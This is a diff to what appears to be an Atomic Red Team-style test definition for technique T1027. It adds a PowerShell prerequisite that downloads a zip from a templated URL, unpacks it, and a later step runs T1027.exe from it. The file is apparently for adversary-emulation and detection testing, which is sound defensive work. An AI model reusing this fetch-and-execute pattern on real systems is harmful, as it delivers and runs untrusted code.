@@ -16,6 +16,15 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        T1027.exe must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip"
+        Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\" -Force
+        }}
+      executor: powershell
     - name: execution-from-compressed-file
       inline: |
         "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"
